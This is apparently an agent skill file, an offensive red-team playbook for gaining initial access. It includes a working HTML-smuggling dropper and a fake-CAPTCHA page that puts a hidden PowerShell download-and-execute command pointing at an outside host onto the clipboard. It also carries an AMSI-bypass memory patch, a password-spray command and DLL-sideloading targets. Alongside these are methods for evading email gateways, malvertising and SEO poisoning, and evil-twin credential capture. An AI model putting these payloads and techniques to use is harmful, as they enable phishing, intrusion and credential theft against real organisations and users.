---
name: initial-access
description: Modern initial access techniques — phishing, payload delivery, HTML smuggling, ISO/IMG bypass, supply chain attacks, credential stuffing, exposed service exploitation
metadata:
  type: offensive
  phase: initial-access
  mitre: TA0001
kill_chain:
  phase: [delivery]
  step: [3]
  attck_tactics: [TA0001]
depends_on: [recon-osint, exploit-development, edr-evasion]
feeds_into: [red-team-ops]
inputs: [target_profile, payload, evasion_technique]
outputs: [initial_foothold, delivery_report]
---

# Initial Access

## When to Activate

- Planning initial access phase of red team engagement
- Developing phishing campaigns and payload delivery
- Bypassing email gateways and endpoint protection
- Exploiting exposed services for initial foothold

## Attack Vectors

### Email-Based (Phishing)

**Payload Delivery Formats** (bypass probability):
- `.exe` — almost always blocked
- `.iso/.img` — bypasses MOTW (Mark of the Web) on older Windows
- `.html` (smuggling) — high success rate
- `.pdf` with embedded JS — moderate
- `.one` (OneNote) — effective until patched
- `.lnk` + DLL sideload — high success in ISO container
- `.pptm/.ppsm/.accde` — often not covered by default protection

**Domain Preparation**:
- Domain age > 2 weeks (warm up with legitimate emails first)
- Use HTTPS with valid certificate
- Category: business/technology (not "newly registered")
- SPF, DKIM, DMARC properly configured
- Send legitimate emails first to build reputation

### HTML Smuggling

```html
<!-- Construct binary blob in JavaScript, trigger download -->
<html>
<body>
<script>
function smuggle() {
    var bin = atob("TVqQAAMAAAAEAAAA..."); // base64 PE
    var blob = new Blob([new Uint8Array([...bin].map(c=>c.charCodeAt(0)))], 
                        {type: 'application/octet-stream'});
    var url = URL.createObjectURL(blob);
    var a = document.createElement('a');
    a.href = url;
    a.download = 'Report_Q4_2026.iso';
    a.click();
}
smuggle();
</script>
<p>Loading document...</p>
</body>
</html>
```

### ISO/IMG Container (MOTW Bypass)

```
# Structure inside ISO:
├── Report.lnk          # Shortcut that executes the DLL
├── legitimate.exe      # Signed binary vulnerable to DLL sideload
└── payload.dll         # Malicious DLL loaded by legitimate.exe

# LNK target: legitimate.exe (which loads payload.dll from same directory)
# Files inside ISO don't inherit MOTW → bypass SmartScreen
```

**Note**: Windows 11 22H2+ propagates MOTW into ISO contents. Use alternative containers or delivery methods for newer targets.

### OneNote (.one) Payload

```
# Embed .bat/.hta behind fake "Double click to view" image
# User double-clicks → executes embedded script
# Effective because OneNote files are rarely blocked by email gateways
```

### DLL Sideloading

```bash
# Find legitimate signed EXE that loads DLL from CWD:
# 1. Use Process Monitor: filter for NAME NOT FOUND on DLL loads
# 2. Common targets: teams.exe (ffmpeg.dll), onedrive, slack
# 3. Place malicious DLL alongside legitimate EXE in delivery package

# Popular sideload targets:
# - Microsoft Teams: ffmpeg.dll
# - OneDrive: secur32.dll
# - Slack: libEGL.dll
# - VS Code: wlanapi.dll (portable mode)
```

## Credential-Based Access

### Credential Stuffing
```bash
# Use breach databases to test against target services
# Tools: Hydra, Burp Intruder, custom scripts
# Targets: VPN portals, OWA, O365, Citrix, RDP

# O365 password spray (avoid lockout: 1 attempt per user per hour)
# Tools: MSOLSpray, Ruler, MailSniper
python3 msolspray.py --userlist users.txt --password 'Company2026!' --url https://login.microsoftonline.com

# Common patterns to try:
# Season+Year: Summer2026!, Winter2025!
# Company+digits: CompanyName1!, Corp2026#
# Month+Year: May2026!, January2026!
```

### Exposed Service Exploitation
```bash
# VPN (Fortinet, Pulse Secure, Citrix, Palo Alto)
# Check for known CVEs: CVE-2023-27997 (Fortinet), CVE-2024-3400 (PAN-OS)
searchsploit fortinet
nuclei -u https://vpn.target.com -t cves/ -severity critical

# Exchange (ProxyShell, ProxyNotShell, OWASSRF)
# RDP (BlueKeep CVE-2019-0708 for legacy)
# Jenkins, GitLab, Confluence (common RCE CVEs)
```

### Supply Chain
```
# Compromise trusted software update mechanism
# Inject into CI/CD pipeline
# Typosquatting on package managers (npm, PyPI)
# Compromise developer workstation → push malicious commit
```

## Staged Payload Architecture

```
Stage 0 (Loader) — extremely light (<30KB), FUD
├── Self-contained, no external dependencies
├── Only job: download/extract/inject Stage 1
├── NOT .exe (use .dll sideload, .hta, .lnk+script)
└── Must bypass email gateway + endpoint AV

Stage 1 (Minimal Implant) — lightweight C2
├── 5-6 commands: ls, whoami, pwd, download, upload, execute
├── Persistent (registry, scheduled task)
├── FUD (may touch disk)
└── Used to deploy Stage 2 after recon

Stage 2 (Full C2) — Cobalt Strike, Sliver, Havoc
├── Full post-exploitation capability
├── In-memory only (never written to disk)
├── Deployed after AV/EDR assessment
└── Replace Stage 1 persistence with Stage 2
```

## OPSEC for Initial Access

- Warm up phishing domain 2+ weeks before engagement
- Use legitimate email services (O365, Google Workspace) for sending
- Limit number of GET elements and parameter names in URLs
- Test payload against target's email gateway (if possible, get sample config)
- Use HTTPS for all payload hosting
- Kill date on all payloads (auto-destruct after engagement window)
- Separate infrastructure per engagement phase (phishing ≠ C2)
- Monitor for blue team interaction with your infrastructure

## Delivery Alternatives

```
# QR code to attacker-controlled site (bypasses email URL scanning)
# Legitimate file-sharing links (OneDrive, Google Drive, Dropbox)
# Vishing (voice phishing) → guide target to download payload
# USB drop (physical access scenarios)
# Watering hole (compromise site frequented by targets)
# LinkedIn/social media DM with "job offer" document
```

## Advanced: Modern Payload Delivery (2024-2026)

### ClickFix / Fake CAPTCHA
```html
<!-- Social engineering: fake CAPTCHA that tricks user into running commands -->
<!-- User sees "Verify you are human" → copies PowerShell command to clipboard -->
<!-- Then instructed to press Win+R and paste -->

<div class="captcha-container">
  <h2>Verify you are human</h2>
  <p>Press Win+R, then Ctrl+V, then Enter</p>
  <button onclick="copyPayload()">I'm not a robot</button>
</div>
<script>
function copyPayload() {
    navigator.clipboard.writeText(
        'powershell -w hidden -ep bypass -c "IEX(IWR https://cdn.legit-looking.com/update.ps1)"'
    );
    document.querySelector('.captcha-container').innerHTML = 
        '<p>✓ Verification step 2: Press Win+R, paste (Ctrl+V), press Enter</p>';
}
</script>
```

### Search Engine Optimization (SEO) Poisoning
```
# Compromise or create sites that rank for targeted searches
# Target: "download [software] free", "[tool] crack", "[error] fix"
# User searches → finds malicious site → downloads trojanized installer

# Technique:
# 1. Register domain similar to legitimate software site
# 2. SEO optimize for target keywords
# 3. Host trojanized installer (legitimate software + payload)
# 4. Payload executes silently during "installation"

# Targeted variant (watering hole):
# 1. Identify sites frequented by target organization
# 2. Compromise site (or buy ad space)
# 3. Serve exploit/payload only to visitors from target IP range
# 4. Use browser fingerprinting to avoid researchers
```

### Malvertising (Ad-Based Delivery)
```
# Buy ads on legitimate platforms → redirect to exploit kit or fake download
# Targeting: geo, industry, job title, interests
# Evasion: cloaking (show benign content to ad reviewers, malicious to targets)

# Flow:
# 1. User clicks ad (or ad auto-redirects)
# 2. Landing page fingerprints browser/OS
# 3. If target matches: serve exploit or fake update prompt
# 4. If researcher/bot: serve benign content

# Google Ads abuse:
# - Bid on brand keywords (e.g., "download putty")
# - Ad appears above legitimate result
# - Links to typosquatted domain with trojanized download
```

### Teams/Slack Message Delivery
```
# Microsoft Teams external messaging (if enabled):
# - Send message with malicious link/file from external tenant
# - Appears as legitimate business communication
# - Bypasses email gateway entirely

# Technique:
# 1. Create legitimate-looking M365 tenant
# 2. Send Teams message to target (external access often enabled)
# 3. Include: "shared document" link → credential phishing
# 4. Or: file attachment (if allowed) → payload delivery

# Slack:
# - Slack Connect allows cross-org messaging
# - Shared channels can be used for payload delivery
# - Webhook abuse: if webhook URL leaked → inject messages
```

## Advanced: Evasion Techniques for Delivery

### Email Gateway Bypass
```
# Techniques to bypass Proofpoint, Mimecast, Microsoft Defender for O365:

# 1. Delayed payload (time-bomb URL)
#    - Send email with link to benign page
#    - After email passes scanning: change page to malicious
#    - Gateway scanned at delivery time → clean
#    - User clicks hours later → malicious

# 2. CAPTCHA-gated payload
#    - Link goes to page with CAPTCHA
#    - Automated scanners can't solve CAPTCHA → see benign page
#    - Human user solves → gets payload

# 3. QR code in email body
#    - Many gateways don't scan QR codes in images
#    - QR points to phishing page or payload download
#    - User scans with phone → bypasses corporate proxy too

# 4. Legitimate file-sharing services
#    - Upload payload to OneDrive/SharePoint/Google Drive
#    - Share link in email
#    - Gateway trusts Microsoft/Google URLs
#    - Some gateways now scan shared files — use password protection

# 5. Reply-chain hijacking
#    - Compromise mailbox → reply to existing thread
#    - Recipients trust the context of ongoing conversation
#    - Attachment/link in reply seems natural
```

### Endpoint Protection Bypass
```bash
# SmartScreen bypass (Windows):
# - Sign payload with valid code signing certificate (EV cert = auto-trust)
# - Use file types that don't trigger SmartScreen (.msi with valid sig)
# - Deliver via ISO/VHD (MOTW not propagated on older Windows)

# AMSI bypass for PowerShell delivery:
# Patch amsi.dll in memory before loading payload
$a=[Ref].Assembly.GetTypes()|?{$_.Name -like "*iUtils"}
$b=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Context"}
[IntPtr]$ptr=$b.GetValue($null)
[Int32[]]$buf=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)

# Mark-of-the-Web removal:
# Files from internet get Zone.Identifier ADS
# Remove: streams.exe -d file.exe
# Or: copy file through pipe: type file.exe > clean.exe
# Or: deliver inside container (ISO/VHD/7z) that strips MOTW
```

## Advanced: Physical Access Vectors

### USB-Based Attacks
```bash
# Rubber Ducky / BadUSB
# Device appears as keyboard → types commands at HID speed
# Payload: open PowerShell → download and execute

# USB Armory / LAN Turtle
# Device appears as network adapter → MITM all traffic
# Respond to LLMNR/NBT-NS → capture NTLM hashes

# Bash Bunny
# Multi-function: storage + HID + network
# Exfiltrate files, inject keystrokes, network attacks

# O.MG Cable
# Looks like normal USB cable → contains WiFi-enabled implant
# Remote command execution via WiFi connection to cable
```

### WiFi-Based Initial Access
```bash
# Evil Twin for corporate WiFi:
# 1. Clone corporate SSID (WPA Enterprise)
# 2. Use hostapd-wpe to capture RADIUS credentials
# 3. Crack MSCHAPv2 challenge/response
# 4. Use credentials for VPN/email/internal access

hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
# Captures: username + challenge + response
asleap -C CHALLENGE -R RESPONSE -W wordlist.txt

# Rogue AP for credential capture:
# 1. Create open AP with captive portal
# 2. Portal mimics corporate SSO login
# 3. Capture credentials when users "authenticate"
```
